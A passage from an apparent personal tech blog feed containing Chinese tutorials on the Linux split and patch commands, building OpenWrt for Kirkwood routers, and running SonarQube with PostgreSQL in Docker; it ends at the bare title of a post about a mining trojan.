    <content type="html"><![CDATA[<h2 id="在树莓派3B上安装安卓TV"><a href="#在树莓派3B上安装安卓TV" class="headerlink" title="在树莓派3B上安装安卓TV   "></a>在树莓派3B上安装安卓TV   </h2><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>将一个大文件分成若干个小文件方法</p><p>例如将一个BLM.txt文件分成前缀为 BLM_ 的1000个小文件，后缀为系数形式，且后缀为4位数字形式</p><p>先利用</p><p>wc -l BLM.txt       读出 BLM.txt 文件一共有多少行</p><p>再利用 split 命令</p><p>split -l 2482 ..&#x2F;BLM&#x2F;BLM.txt -d -a 4 BLM_</p><p>将 文件 BLM.txt 分成若干个小文件，每个文件2482行(-l 2482)，文件前缀为BLM_ ，系数不是字母而是数字（-d），后缀系数为四位数（-a 4）</p><p>linux下文件分割可以通过split命令来实现，可以指定按行数分割和安大小分割两种模式。Linux下文件合并可以通过cat命令来实现，非常简单。</p><p>　　在Linux下用split进行文件分割：</p><p>　　模式一：指定分割后文件行数</p><p>　　对与txt文本文件，可以通过指定分割后文件的行数来进行文件分割。</p><p>　　命令：split -l 300 large_file.txt new_file_prefix</p><p>　　模式二：指定分割后文件大小</p><p>   split -b 10m server.log waynelog</p><p>   对二进制文件我们同样也可以按文件大小来分隔。</p><p>在Linux下用cat进行文件合并：</p><p>　　命令：cat small_files* &gt; large_file</p><p>将a.txt的内容输入到b.txt的末尾</p><p>cat a.txt &gt;&gt; b.txt</p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="https://blog.csdn.net/mxgsgtc/article/details/12048919">https://blog.csdn.net/mxgsgtc/article/details/12048919</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Split</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习kernel patch</title>
    <link href="/2020/02/13/2020-02-13-learn-kernel-patch/"/>
    <url>/2020/02/13/2020-02-13-learn-kernel-patch/</url>
    
    <content type="html"><![CDATA[<h2 id="学习kernel-patch"><a href="#学习kernel-patch" class="headerlink" title="学习kernel patch    "></a>学习kernel patch    </h2><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>编译openwrt固件,对于小众板子,需要自行构建patch,在构建过程中遇到不少坑,在这里记录一下,主要是自己<br>太菜,好多知识不明白</p><h2 id="patch文件格式解说"><a href="#patch文件格式解说" class="headerlink" title="patch文件格式解说"></a>patch文件格式解说</h2><p>patch    </p><blockquote><p>patch命令跟diff配合使用，把生成的补丁应用到现有代码上。常用命令行选项：</p><p>　　patch [命令行选项] [待patch的文件[patch]]</p><p>　　-pn patch level(n是数字) -b[后缀] 生成备份，缺省是.orig</p><p>为了说明什么是patch level，这里看一个patch文件的头标记。</p></blockquote><p>　　diff -ruNa xc.orig&#x2F;config&#x2F;cf&#x2F;Imake.cf xc.bsd&#x2F;config&#x2F;cf&#x2F;Imake.cf</p><p>　　— xc.orig&#x2F;config&#x2F;cf&#x2F;Imake.cf Fri Jul 30 12:45:47 1999</p><p>　　+++ xc.new&#x2F;config&#x2F;cf&#x2F;Imake.cf Fri Jan 21 13:48:44 2000</p><p>　　这个patch如果直接应用，它会去找xc.orig&#x2F;config&#x2F;cf目录下的Imake.cf文件，假如你的源码树的根目录是缺省的xc而不是xc.orig，除了mv xc xc.orig之外，有无简单的方法应用此patch呢？patch level就是为此而设：patch会把目标路径名砍去开头patch level个节(由&#x2F;分开的部分)。在本例中，可以用下述命令：cd xc; patch _p1 &lt; &#x2F;pathname&#x2F;xxx.patch 完成操作。注意，由于没有指定patch文件，patch程序默认从stdin读入，所以用了输入重定向。</p><p>　　如果patch成功，缺省是不建备份文件的(注：FreeBSD下的patch工具缺省是保存备份)，如果你需要，可以加上 b 开关。这样把修改前的文件以“原文件名.orig”的名字做备份。如果你喜欢其它后缀名，也可以用“b 后缀”来指定。</p><p>　　如果patch失败，patch会把成功的patch行给patch上，同时（无条件）生成备份文件和一个.rej文件。.rej文件里是没有成功提交的patch行，需要手工patch上去。这种情况在原码升级的时候有可能会发生。</p><p>　　关于二进制文件的说明：binary文件可以原始方式存入patch文件。diff可以生成(加-a选项),patch也可以识别。如果觉得这样的patch文件太难看，解决方法之一是用uuencode处理该binary文件。</p><h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><h3 id="1-arch-x2F-arm-x2F-boot-x2F-dts-x2F-kirkwood-butong-dtb-ERROR-phandle-references-Reference-to-non-existent-node-or-label-“pmx-sdio-cd”"><a href="#1-arch-x2F-arm-x2F-boot-x2F-dts-x2F-kirkwood-butong-dtb-ERROR-phandle-references-Reference-to-non-existent-node-or-label-“pmx-sdio-cd”" class="headerlink" title="1.arch&#x2F;arm&#x2F;boot&#x2F;dts&#x2F;kirkwood-butong.dtb: ERROR (phandle_references): Reference to non-existent node or label “pmx_sdio_cd”"></a>1.arch&#x2F;arm&#x2F;boot&#x2F;dts&#x2F;kirkwood-butong.dtb: ERROR (phandle_references): Reference to non-existent node or label “pmx_sdio_cd”</h3><p>主要是在配置过程中未检测变量是否定义,胡乱粘贴就编译</p><p>一个最简单的patch的格式</p><p>— 旧文件<br>+++ 新文件<br>@@  —旧行号开始，旧行号结束 +新行号开始，新行号结束 @@                      <br> 不改动的文件内容<br> 不改动的文件内容<br> 不改动的文件内容<br>+增加的行<br>-删除的行<br> 不改动的文件内容<br> 不改动的文件内容<br> 不改动的文件内容 </p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="https://www.cnblogs.com/the-tops/p/6068669.html">https://www.cnblogs.com/the-tops/p/6068669.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kernel</tag>
      
      <tag>Openwrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在ubuntu19.10上编译openwrt19.07</title>
    <link href="/2020/02/12/2020-02-12-compile-openwrt-1907-on-ubuntu1910/"/>
    <url>/2020/02/12/2020-02-12-compile-openwrt-1907-on-ubuntu1910/</url>
    
    <content type="html"><![CDATA[<h2 id="在ubuntu19-10上编译openwrt19-07"><a href="#在ubuntu19-10上编译openwrt19-07" class="headerlink" title="在ubuntu19.10上编译openwrt19.07"></a>在ubuntu19.10上编译openwrt19.07</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>手上有一块任子行的NET110(88F6281)的路由器,还有一块环硕科技(公司已倒闭)的路由器,同样基于88F6281 A1,由于较为小众,固件需要自行编译,本文内容完全是作者自己在编译过程中的血泪史,如果你遇到同样的问题,可以一起交流.</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>之前使用archlinux编译openwrt的估计,但是出现各种各样玄学问题,再加上梯子不稳定,后续直接转移到梯子上进行编译,虽说速度有点儿慢.</p><h3 id="安装编译环境"><a href="#安装编译环境" class="headerlink" title="安装编译环境"></a>安装编译环境</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">apt update &amp;&amp; apt <span class="hljs-keyword">distupgrade </span>-y<br>apt <span class="hljs-keyword">install </span>gcc g++ <span class="hljs-keyword">binutils </span>patch <span class="hljs-keyword">bzip2 </span>flex <span class="hljs-keyword">bison </span>make autoconf gettext texinfo unzip <span class="hljs-keyword">sharutils </span><span class="hljs-keyword">subversion </span>libncurses5-dev ncurses-term zlib1g-dev gawk  libssl-dev -y<br></code></pre></td></tr></table></figure><h3 id="下载openwrt并更新相关组件"><a href="#下载openwrt并更新相关组件" class="headerlink" title="下载openwrt并更新相关组件"></a>下载openwrt并更新相关组件</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">https:<span class="hljs-comment">//github.com/openwrt/openwrt.git</span><br><span class="hljs-string">``</span><span class="hljs-string">`    </span><br><span class="hljs-string">进入openwrt目录执行    </span><br></code></pre></td></tr></table></figure><p>make prereq<br>.&#x2F;scripts&#x2F;feeds update -a<br>.&#x2F;scripts&#x2F;feeds install -a</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">### 配置编译内容<br></code></pre></td></tr></table></figure><p>make defconfig</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">### * 增加自定义patch</span><br>部分平台比较小众,openwrt并为提供相关编译选项,需要自定添加<span class="hljs-keyword">patch</span>,<span class="hljs-keyword">patch</span>的位置在 **openwrt/target/linux/平台<span class="hljs-string">/patches-xx/</span>** 目录下,这个需要根据实际情况进行更改,我这里的板子是kirkwood,在patches-4.14目录添加自己板子的<span class="hljs-keyword">patch</span>,其他配置信息需要修改kirkwood目录下的base-files和image,这里我会在接下来的博文详细说明,这里不赘述,你可以直接将我配置好的patches添加到编译目录下,地址:[https:<span class="hljs-string">//github.com/hksanduo/kirkwood-88F6281</span>]<span class="hljs-params">(https://github.com/hksanduo/kirkwood-88F6281)</span><br><br>然后更新平台信息<br></code></pre></td></tr></table></figure><p>make target&#x2F;linux&#x2F;clean V&#x3D;99<br>make target&#x2F;linux&#x2F;prepare V&#x3D;99<br>make target&#x2F;linux&#x2F;update V&#x3D;99</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>感到奇怪,使用```make target/linux/refresh V=s -j99```总会出现使用<span class="hljs-number">4.19</span>内核编译出现问题<br><br>## 编译<br><span class="hljs-title">如果使用root权限编译,需要用到:</span><br></code></pre></td></tr></table></figure><p>make V&#x3D;s -j99 IGNORE_ERRORS&#x3D;1 FORCE_UNSAFE_CONFIGURE&#x3D;1</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## 遇到的错误<br>### <span class="hljs-number">1.</span>WARNING: Makefile <span class="hljs-string">&#x27;package/xx/xx&#x27;</span> has a dependency on <span class="hljs-string">&#x27;libxxx&#x27;</span>, which does not exist<br>不太清楚为何该lib包没有通过脚本自动安装,需要更新feeds手动安装<br></code></pre></td></tr></table></figure><p>.&#x2F;scripts&#x2F;feeds updata -a<br> .&#x2F;scripts&#x2F;feeds install libxxx</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">终端显示 **Installing <span class="hljs-keyword">package</span> <span class="hljs-symbol">&#x27;libxxx</span>&#x27; from packages** 完成安装<br><br>### <span class="hljs-number">2</span>.gcc: fatal <span class="hljs-literal">error</span>: Killed <span class="hljs-keyword">signal</span> terminated program cc1<br>编译过程中gcc报错:gcc: fatal <span class="hljs-literal">error</span>: Killed <span class="hljs-keyword">signal</span> terminated program cc1<br>大体上是因为内存不足,临时使用交换分区来解决吧<br></code></pre></td></tr></table></figure><p>sudo dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;swapfile bs&#x3D;64M count&#x3D;16<br>sudo mkswap &#x2F;swapfile<br>sudo swapon &#x2F;swapfile</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">编译完成，可以取消交换分区：<br></code></pre></td></tr></table></figure><p>sudo swapoff &#x2F;swapfile<br>sudo rm &#x2F;swapfile</p><pre><code>### 3.compile devicetree.dts error: Unable to parse input tree这个错误很可能是我们在写节点时多加了或者少写了“&#125;”符号造成的，特别是节点里面包含了一些子节点的情况下，很容易少加“&#125;”符号。解决思路：由于gedit打开dts文件，dts内容的层次结构不好一眼看出，需要把dts内容copy到sourceinsight、UlterEdit或者其他文本工具里编辑，总之一点能让dts内容层次分明。这样一下就可以定位是那个节点存在少加或者多加‘&#125;’符号。### 4.固件可以在板子上运行,但是找不到网卡,这个有些尴尬,固件还是不完美,目前也没时间去玩了,各位看官可以尝试解决一下## 参考* [https://forum.openwrt.org/t/solved-build-error-make-toplevel-mk-world-error-2/47478](https://forum.openwrt.org/t/solved-build-error-make-toplevel-mk-world-error-2/47478)* [https://blog.csdn.net/walker0411/article/details/51916959](https://blog.csdn.net/walker0411/article/details/51916959)* [https://blog.csdn.net/flexman09/article/details/51862858?utm_source=itdadao&amp;utm_medium=referral](https://blog.csdn.net/flexman09/article/details/51862858?utm_source=itdadao&amp;utm_medium=referral)* [https://www.cnblogs.com/hubery/p/4633863.html](https://www.cnblogs.com/hubery/p/4633863.html)* [https://blog.csdn.net/renlonggg/article/details/53784509](https://blog.csdn.net/renlonggg/article/details/53784509)* [https://openwrt.org/docs/guide-developer/quickstart-build-images](https://openwrt.org/docs/guide-developer/quickstart-build-images)</code></pre>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kernel</tag>
      
      <tag>Openwrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用docker安装sonarqube</title>
    <link href="/2020/02/07/2020-02-07-install-sonarqube-on-docker/"/>
    <url>/2020/02/07/2020-02-07-install-sonarqube-on-docker/</url>
    
    <content type="html"><![CDATA[<h2 id="使用docker安装sonarqube"><a href="#使用docker安装sonarqube" class="headerlink" title="使用docker安装sonarqube"></a>使用docker安装sonarqube</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用docker部署相关应用,方便,省事,对系统影响较小,拥有开箱即用等优点,总之很香,对比互联网上找到的教程,或多或少有些问题,<br>有的甚至存在误导的嫌疑,扯这么多,其实看的最多也可能是自己.废话不多说了,开始安装.</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>个人使用的平台是archlinux,版本号为:5.4.15-arch1-1,使用的docker版本为19.03.5-ce,需要安装的Sonarqube和PostgreSQL版本均为latest(截止到今天),Sonarqube对应的版本为7.9.2,PostgreSQL对应的版本为:12.1,参考的同学注意文章的实效性.</p><ul><li>注意:如果在获取docker镜像时速度缓慢,尝试使用中科大的镜像站,或者使用厂商的加速器均可.</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装sonarqube和postgres"><a href="#安装sonarqube和postgres" class="headerlink" title="安装sonarqube和postgres"></a>安装sonarqube和postgres</h3><p>在终端中输入以下执行,获取相应的docker镜像.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull postgres:latest<br>docker pull sonarqube:latest<br></code></pre></td></tr></table></figure><h3 id="创建一个PostgreSQL-Docker容器"><a href="#创建一个PostgreSQL-Docker容器" class="headerlink" title="创建一个PostgreSQL Docker容器"></a>创建一个PostgreSQL Docker容器</h3><p>Sonarqube依赖于数据库才能正常工作，在这里，我们选择PostgreSQL。下面的命令作用是创建用户名为sonar，密码为sonar的PostgreSQL实例并运行，在mynet容器网络中将主机端口5432与容器端口5432绑定在一起。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> --name sonar-postgres -e <span class="hljs-attribute">POSTGRES_USER</span>=sonar -e <span class="hljs-attribute">POSTGRES_PASSWORD</span>=sonar -d -p 5432:5432  postgres<br></code></pre></td></tr></table></figure><h3 id="创建一个Sonar-Qube-Docker容器"><a href="#创建一个Sonar-Qube-Docker容器" class="headerlink" title="创建一个Sonar Qube Docker容器"></a>创建一个Sonar Qube Docker容器</h3><p>配置系统：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sysctl</span> -w vm.max_map_count=<span class="hljs-number">262144</span><br><span class="hljs-attribute">sysctl</span> -w fs.file-max=<span class="hljs-number">65536</span><br><span class="hljs-attribute">ulimit</span> -n <span class="hljs-number">65536</span><br><span class="hljs-attribute">ulimit</span> -u <span class="hljs-number">4096</span><br></code></pre></td></tr></table></figure><p>这里我们使用使用宿主机的IP加上容器暴露出的端口号来通信,我的宿主机ip为192.168.3.200<br>以下命令的作用主要是通过JDBC连接PostgreSQL数据库创建并运行SonarQube实例。将主机端口9000绑定到mynet容器网络内部的容器端口9000。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> --name sonarqube -d -p 9000:9000 -e <span class="hljs-attribute">SONARQUBE_JDBC_USERNAME</span>=sonar -e <span class="hljs-attribute">SONARQUBE_JDBC_PASSWORD</span>=sonar -e <span class="hljs-attribute">SONARQUBE_JDBC_URL</span>=jdbc:postgresql://192.168.3.200:5432/sonar sonarqube<br></code></pre></td></tr></table></figure><h3 id="查看是否安装成功"><a href="#查看是否安装成功" class="headerlink" title="查看是否安装成功"></a>查看是否安装成功</h3><p>执行<code>docker ps</code><br><img src="/img/20200207-docker-ps.png" alt="docker-ps.png"><br>查看sonar和postgres实例进程是否正常</p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>在宿主机上直接访问  <a href="http://localhost:9000/">http://localhost:9000</a>, 账户和密码均为admin.如果需要开放宿主机端口供其他主机访问,请使用iptables或者firewall-cmd自行增加防火墙规则,这里就不在赘述了.<br><img src="/img/20200207-sonar-login.png" alt="sonarqube-login.png"></p><h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><h3 id="1-使用容器自定义网络-sonarqube-jdbc连接失败"><a href="#1-使用容器自定义网络-sonarqube-jdbc连接失败" class="headerlink" title="1.使用容器自定义网络,sonarqube jdbc连接失败."></a>1.使用容器自定义网络,sonarqube jdbc连接失败.</h3><p>我最初使用官方提供的方式,设置容器网络进行通信,但是sonarqube使用jdbc链接postgres数据库时总会出现连接数据库失败的提示,目前我没有找到原因,只能使用固定ip进行访问,有点儿失败.<br><img src="/img/20200207-sonarqube-connect-error.png" alt="sonarqube-connect-error.png"></p><p>以下是我安装的步骤,如果哪位大佬有解决方法,烦请不吝赐教,毕竟使用固定ip访问数据库不是一件长久的事情.</p><h4 id="为sonarqube和postgres创建相应的容器网络"><a href="#为sonarqube和postgres创建相应的容器网络" class="headerlink" title="为sonarqube和postgres创建相应的容器网络"></a>为sonarqube和postgres创建相应的容器网络</h4><p>为了提高Sonar和Postgres容器之间的通信，我们创建一个Docker Network。以下命令将创建一个名为mynet的容器网络。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker network create mynet</span><br></code></pre></td></tr></table></figure><h4 id="创建一个PostgreSQL-Docker容器-1"><a href="#创建一个PostgreSQL-Docker容器-1" class="headerlink" title="创建一个PostgreSQL Docker容器"></a>创建一个PostgreSQL Docker容器</h4><p>Sonarqube依赖于数据库才能正常工作，在这里，我们选择PostgreSQL。下面的命令作用是创建用户名为sonar，密码为sonar的PostgreSQL实例并运行，在mynet容器网络中将主机端口5432与容器端口5432绑定在一起。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> --name sonar-postgres -e <span class="hljs-attribute">POSTGRES_USER</span>=sonar -e <span class="hljs-attribute">POSTGRES_PASSWORD</span>=sonar -d -p 5432:5432 --network mynet postgres<br></code></pre></td></tr></table></figure><h4 id="创建一个Sonar-Qube-Docker容器-1"><a href="#创建一个Sonar-Qube-Docker容器-1" class="headerlink" title="创建一个Sonar Qube Docker容器"></a>创建一个Sonar Qube Docker容器</h4><p>以下命令的作用主要是通过JDBC连接PostgreSQL数据库创建并运行SonarQube实例。将主机端口9000绑定到mynet容器网络内部的容器端口9000。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> --name sonarqube -p 9000:9000 -e <span class="hljs-attribute">SONARQUBE_JDBC_USERNAME</span>=sonar -e <span class="hljs-attribute">SONARQUBE_JDBC_PASSWORD</span>=sonar -e <span class="hljs-attribute">SONARQUBE_JDBC_URL</span>=jdbc:postgresql://sonar-postgres:5432/sonar -d --network mynet sonarqube<br></code></pre></td></tr></table></figure><h3 id="2-elasticsearch-无法启动"><a href="#2-elasticsearch-无法启动" class="headerlink" title="2.elasticsearch 无法启动"></a>2.elasticsearch 无法启动</h3><p>bootstrap checks failed主要原因是elasticsearch启动失败,elasticsearch需要的vm.max_map_count至少为262144<br><img src="/img/20200207-bootstrap-checks-failed.png" alt="20200207-bootstrap-checks-failed.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">max</span> virtual memory areas <span class="hljs-keyword">vm</span>.max_map_count [<span class="hljs-number">65530</span>] <span class="hljs-keyword">is</span> too low, increase <span class="hljs-keyword">to</span> at least [<span class="hljs-number">262144</span>]<br></code></pre></td></tr></table></figure><p>解决方法,通过在root权限用户下执行以下指令:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sysctl -w vm.<span class="hljs-attribute">max_map_count</span>=262144<br></code></pre></td></tr></table></figure><h3 id="3-防火墙"><a href="#3-防火墙" class="headerlink" title="3.防火墙"></a>3.防火墙</h3><p>docker会在firewalld的规则列表中增加一个docker的域（zone），并且docker0网卡默认是关联到这个docker域下面的，部分系统如果安装docker,默认启用的域会被修改成docker,如果需要开放端口，方便其他人远程访问，需要使用指定域为docker。可参考以下指令：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">add</span><span class="hljs-literal">-</span><span class="hljs-comment">port=9000/tcp</span> <span class="hljs-literal">--</span><span class="hljs-comment">permanent</span> <span class="hljs-literal">--</span><span class="hljs-comment">zone=docker</span><br><span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">reload</span><br></code></pre></td></tr></table></figure><p>需要注意：在启动sonarqube服务器过程中，如果未设置数据库，sonarqube的web服务会正常启动，如果配置了数据库，但是由于种种原因，数据库无法被访问到，sonarqube的web服务是失效的，在调试防火墙的过程中先确定当前sonarqube是否成功运行，可以使用指令 <code>docker logs $&#123;sonarqube容器名称&#125;</code> 来查看sonarqube容器启动日志。连接错误日志如下：</p><p><img src="/img/20200207-fail-to-connect-to-database.png" alt="20200207-fail-to-connect-to-database.png"></p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>最近为了方便，也免得之前的做法扰乱大家的思路，我直接构建了一个docker-componse.yml，方便大家直接构建。docker-componse.yml如下：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">services:</span><br>  postgres-db:<br><span class="hljs-symbol">    image:</span> postgres:latest<br><span class="hljs-symbol">    container_name:</span> sonar-postgres<br><span class="hljs-symbol">    ports:</span><br>      - <span class="hljs-number">5432</span>:<span class="hljs-number">5432</span><br><span class="hljs-symbol">    volumes:</span><br>      - .<span class="hljs-keyword">/data/</span>postgres:<span class="hljs-keyword">/data/</span>postgres<br><span class="hljs-symbol">    environment:</span><br><span class="hljs-symbol">      POSTGRES_USER:</span> sonar<br><span class="hljs-symbol">      POSTGRES_PASSWORD:</span> <span class="hljs-number">1</span>qaz@WSX<br><span class="hljs-symbol">      PGDATA:</span> <span class="hljs-keyword">/data/</span>postgres<br><span class="hljs-symbol">    networks:</span><br>      - sonarqube<br><span class="hljs-symbol">    restart:</span> unless-stopped<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  sonarqube:</span><br><span class="hljs-symbol">    image:</span> sonarqube:latest<br><span class="hljs-symbol">    container_name:</span> sonarqube<br><span class="hljs-symbol">    ports:</span><br>      - <span class="hljs-number">9000</span>:<span class="hljs-number">9000</span><br><span class="hljs-symbol">    depends_on:</span><br>      - postgres-db<br><span class="hljs-symbol">    environment:</span><br><span class="hljs-symbol">      SONARQUBE_JDBC_USERNAME:</span> sonar<br><span class="hljs-symbol">      SONARQUBE_JDBC_PASSWORD:</span> <span class="hljs-number">1</span>qaz@WSX<br><span class="hljs-symbol">      SONARQUBE_JDBC_URL:</span> jdbc:postgresql:<span class="hljs-comment">//postgres-db:5432/sonar</span><br><span class="hljs-symbol">    volumes:</span><br>      - .<span class="hljs-keyword">/data/</span>sonarqube/sonarqube_data:<span class="hljs-keyword">/opt/</span>sonarqube/data<br>      - .<span class="hljs-keyword">/data/</span>sonarqube/sonarqube_extensions:<span class="hljs-keyword">/opt/</span>sonarqube/extensions<br>      - .<span class="hljs-keyword">/data/</span>sonarqube/sonarqube_logs:<span class="hljs-keyword">/opt/</span>sonarqube/logs<br><span class="hljs-symbol">    networks:</span><br>      - sonarqube<br><span class="hljs-symbol">    restart:</span> unless-stopped<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">networks:</span><br><span class="hljs-symbol">  sonarqube:</span><br><span class="hljs-symbol">    driver:</span> bridge<br><br></code></pre></td></tr></table></figure><p>使用sonarqube和postgres结合的方式，数据库的用户名为：sonar,密码各位看官自行配置即可，数据已做了本地映射</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://hub.docker.com/_/sonarqube">https://hub.docker.com/_&#x2F;sonarqube</a></li><li><a href="https://birdben.github.io/2017/05/02/Docker/Docker%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%89Docker%E5%AE%B9%E5%99%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1/">https://birdben.github.io/2017/05/02/Docker/Docker%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%89Docker%E5%AE%B9%E5%99%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1/</a></li><li><a href="https://s0docs0docker0com.icopy.site/engine/reference/commandline/network_create/">https://s0docs0docker0com.icopy.site/engine/reference/commandline/network_create&#x2F;</a></li><li><a href="https://www.cnkirito.moe/docker-network-bridge/">https://www.cnkirito.moe/docker-network-bridge/</a></li><li><a href="https://gist.github.com/ceduliocezar/b3bf93125024482b5f2f479696842046">https://gist.github.com/ceduliocezar/b3bf93125024482b5f2f479696842046</a></li><li><a href="https://github.com/SonarSource/docker-sonarqube/issues/282">https://github.com/SonarSource/docker-sonarqube/issues/282</a></li><li><a href="https://docs.sonarqube.org/latest/setup/get-started-2-minutes/">https://docs.sonarqube.org/latest/setup/get-started-2-minutes/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Code Audit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个名叫aliyun的挖矿木马处理过程</title>
    <link href="/2019/12/19/2019-12-19-clean-up-a-mining-trojan-named-aliyun/"/>
    <url>/2019/12/19/2019-12-19-clean-up-a-mining-trojan-named-aliyun/</url>
    
